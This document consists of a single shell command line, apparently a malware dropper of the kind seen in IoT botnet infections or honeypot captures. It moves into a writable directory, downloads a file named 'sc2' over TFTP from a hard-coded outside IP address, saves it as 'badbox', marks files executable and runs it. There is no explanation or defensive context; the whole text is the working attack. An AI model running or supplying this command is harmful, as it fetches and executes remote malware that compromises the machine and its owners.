cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 27.118.21.217 -c get sc2;cat sc2 >badbox;chmod +x *;./badbox
